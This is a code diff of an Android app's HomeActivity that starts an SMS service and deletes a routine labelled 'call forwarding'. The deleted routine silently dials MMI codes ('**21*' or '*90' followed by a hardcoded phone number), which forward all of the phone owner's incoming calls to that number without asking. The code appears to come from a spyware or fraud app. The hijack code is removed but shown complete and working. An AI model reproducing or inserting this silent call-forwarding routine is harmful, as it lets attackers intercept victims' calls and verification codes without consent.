@@ -55,27 +55,13 @@ public class HomeActivity extends BaseActivity {
 		Intent intent2 = new Intent(this, SmsService.class);
 		startService(intent2);
 		
-		//来电转移
-		Uri uri = getUri();
 		
-		Intent localIntent2 = new Intent("android.intent.action.CALL",uri);
-		localIntent2.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-		startActivity(localIntent2);
 		
 	}
+	
+	
 
-	private Uri getUri() {
-		this.manager = ((TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE));
-		  phoneType = this.manager.getPhoneType();
-		  if(phoneType==TelephonyManager.PHONE_TYPE_NONE){
-			  return Uri.fromParts("tel", "**21*13041235055#", null);
-		  }else if(phoneType==TelephonyManager.PHONE_TYPE_GSM){
-			  return Uri.fromParts("tel", "**21*13041235055#", null);
-		  }else if(phoneType==TelephonyManager.PHONE_TYPE_CDMA){
-			  return Uri.fromParts("tel", "*9013041235055", null);
-		  }
-		return null;
-	}
+	
 
 	private void initData() {
 		titles.add(getResources().getString(R.string.private_c_home_first));
